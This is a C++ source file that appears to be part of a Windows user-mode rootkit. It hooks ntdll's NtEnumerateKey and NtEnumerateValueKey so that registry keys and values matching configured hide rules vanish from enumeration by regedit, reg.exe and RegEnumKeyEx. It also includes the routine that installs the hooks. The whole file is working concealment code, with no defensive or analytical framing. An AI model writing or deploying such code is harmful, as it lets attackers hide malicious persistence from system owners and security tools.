/*
 * hide_reg.cpp - Hide registry keys and values from enumeration.
 *
 * Hooks ntdll!NtEnumerateKey and ntdll!NtEnumerateValueKey. When the
 * entry the caller asked for matches a [HideRegistry] rule, the index is
 * advanced until a visible entry is found, so consumers see a dense,
 * gap-free list - exactly what reg.exe, RegEnumKeyEx and regedit expect.
 *
 * Name extraction depends on the information class; classes that carry
 * no name (KeyValuePartialInformation, KeyFlagsInformation, ...) are
 * passed through untouched. The bounded retry loop fails open (returns
 * the unfiltered result of the original index) after 4096 attempts.
 */
#include "rkhooks.h"
#include "api.h"
#include "../common/rknt.h"
#include "../common/hook.h"
#include "../common/config.h"

#include <string.h>
#include <stddef.h>

#define RK_REG_NAME_MAX_CCH 512
#define RK_REG_MAX_TRIES    4096

typedef RK_pfn_NtEnumerateKey      pfn_NtEK;
typedef RK_pfn_NtEnumerateValueKey pfn_NtEVK;

static pfn_NtEK       Real_NtEnumerateKey      = NULL;
static pfn_NtEVK      Real_NtEnumerateValueKey = NULL;
static volatile LONG  g_installed              = 0;

/* Locate the name inside a KEY_*_INFORMATION struct. Returns 0 when the
 * class carries no name. */
static int key_name(ULONG cls, void *info, const wchar_t **name, size_t *cch)
{
    switch (cls)
    {
        case RK_KeyBasicInformation:
        {
            RK_KEY_BASIC_INFORMATION *i = (RK_KEY_BASIC_INFORMATION *)info;
            *name = i->Name; *cch = i->NameLength / sizeof(WCHAR);
            return 1;
        }
        case RK_KeyNodeInformation:
        {
            RK_KEY_NODE_INFORMATION *i = (RK_KEY_NODE_INFORMATION *)info;
            *name = i->Name; *cch = i->NameLength / sizeof(WCHAR);
            return 1;
        }
        case RK_KeyFullInformation:
        {
            RK_KEY_FULL_INFORMATION *i = (RK_KEY_FULL_INFORMATION *)info;
            *name = i->Name; *cch = i->NameLength / sizeof(WCHAR);
            return 1;
        }
        case RK_KeyNameInformation:
        {
            RK_KEY_NAME_INFORMATION *i = (RK_KEY_NAME_INFORMATION *)info;
            *name = i->Name; *cch = i->NameLength / sizeof(WCHAR);
            return 1;
        }
        case RK_KeyCachedInformation:
        {
            /* Same leading shape as KEY_FULL_INFORMATION up to Name. */
            RK_KEY_FULL_INFORMATION *i = (RK_KEY_FULL_INFORMATION *)info;
            *name = i->Name; *cch = i->NameLength / sizeof(WCHAR);
            return 1;
        }
        default:
            return 0;
    }
}

/* Locate the name inside a KEY_VALUE_*_INFORMATION struct. */
static int value_name(ULONG cls, void *info, const wchar_t **name, size_t *cch)
{
    switch (cls)
    {
        case RK_KeyValueBasicInformation:
        {
            RK_KEY_VALUE_BASIC_INFORMATION *i = (RK_KEY_VALUE_BASIC_INFORMATION *)info;
            *name = i->Name; *cch = i->NameLength / sizeof(WCHAR);
            return 1;
        }
        case RK_KeyValueFullInformation:
        {
            RK_KEY_VALUE_FULL_INFORMATION *i = (RK_KEY_VALUE_FULL_INFORMATION *)info;
            *name = i->Name; *cch = i->NameLength / sizeof(WCHAR);
            return 1;
        }
        default:
            /* Partial / PartialAlign carry no name. */
            return 0;
    }
}

/* Copy the name into a bounded buffer and match it against the rules. */
static int reg_matches(const rk_config *cfg,
                       const wchar_t *name, size_t cch)
{
    wchar_t tmp[RK_REG_NAME_MAX_CCH];
    size_t  n;
    int     i;

    /* Absurd lengths: do not touch the buffer. */
    if (!cch || cch >= 0x8000)
        return 0;

    n = cch < RK_REG_NAME_MAX_CCH - 1 ? cch : RK_REG_NAME_MAX_CCH - 1;
    memcpy(tmp, name, n * sizeof(WCHAR));
    tmp[n] = 0;

    for (i = 0; i < cfg->registry_count; ++i)
        if (rk_wcsw(cfg->registry[i], tmp))
            return 1;
    return 0;
}

static NTSTATUS NTAPI Hooked_NtEnumerateKey(
    HANDLE KeyHandle, ULONG Index, ULONG KeyInformationClass,
    PVOID KeyInformation, ULONG Length, PULONG ResultLength)
{
    rk_config cfg;
    NTSTATUS  st;
    ULONG     idx = Index;
    unsigned  tries;

    rk_config_snapshot(&cfg);
    if (!cfg.registry_count)
        return Real_NtEnumerateKey(KeyHandle, Index, KeyInformationClass,
                                   KeyInformation, Length, ResultLength);

    for (tries = 0; tries < RK_REG_MAX_TRIES; ++tries)
    {
        st = Real_NtEnumerateKey(KeyHandle, idx, KeyInformationClass,
                                 KeyInformation, Length, ResultLength);
        if (!NT_SUCCESS(st))
            return st;                       /* includes STATUS_NO_MORE_ENTRIES */

        {
            const wchar_t *name = NULL;
            size_t         cch  = 0;
            if (key_name(KeyInformationClass, KeyInformation, &name, &cch) &&
                reg_matches(&cfg, name, cch))
            {
                ++idx;
                continue;
            }
        }
        return st;
    }

    /* Fail open: hand back the unfiltered result of the original index. */
    return Real_NtEnumerateKey(KeyHandle, Index, KeyInformationClass,
                               KeyInformation, Length, ResultLength);
}

static NTSTATUS NTAPI Hooked_NtEnumerateValueKey(
    HANDLE KeyHandle, ULONG Index, ULONG KeyValueInformationClass,
    PVOID KeyValueInformation, ULONG Length, PULONG ResultLength)
{
    rk_config cfg;
    NTSTATUS  st;
    ULONG     idx = Index;
    unsigned  tries;

    rk_config_snapshot(&cfg);
    if (!cfg.registry_count)
        return Real_NtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass,
                                        KeyValueInformation, Length, ResultLength);

    for (tries = 0; tries < RK_REG_MAX_TRIES; ++tries)
    {
        st = Real_NtEnumerateValueKey(KeyHandle, idx, KeyValueInformationClass,
                                      KeyValueInformation, Length, ResultLength);
        if (!NT_SUCCESS(st))
            return st;

        {
            const wchar_t *name = NULL;
            size_t         cch  = 0;
            if (value_name(KeyValueInformationClass, KeyValueInformation, &name, &cch) &&
                reg_matches(&cfg, name, cch))
            {
                ++idx;
                continue;
            }
        }
        return st;
    }

    return Real_NtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass,
                                    KeyValueInformation, Length, ResultLength);
}

extern "C" int rk_hide_registry_install(void)
{
    void *target, *orig;
    int   rc;

    if (InterlockedExchange(&g_installed, 1))
        return 0;

    target = rk_proc(L"ntdll.dll", "NtEnumerateKey");
    if (target)
    {
        rc = rk_hook(target, (void *)&Hooked_NtEnumerateKey, &orig);
        if (rc != 0)
        {
            g_installed = 0;
            return rc;
        }
        Real_NtEnumerateKey = (pfn_NtEK)orig;
    }

    target = rk_proc(L"ntdll.dll", "NtEnumerateValueKey");
    if (target)
    {
        rc = rk_hook(target, (void *)&Hooked_NtEnumerateValueKey, &orig);
        if (rc != 0)
        {
            g_installed = 0;
            return rc;
        }
        Real_NtEnumerateValueKey = (pfn_NtEVK)orig;
    }

    if (!Real_NtEnumerateKey && !Real_NtEnumerateValueKey)
    {
        g_installed = 0;
        return 1;
    }
    return 0;
}
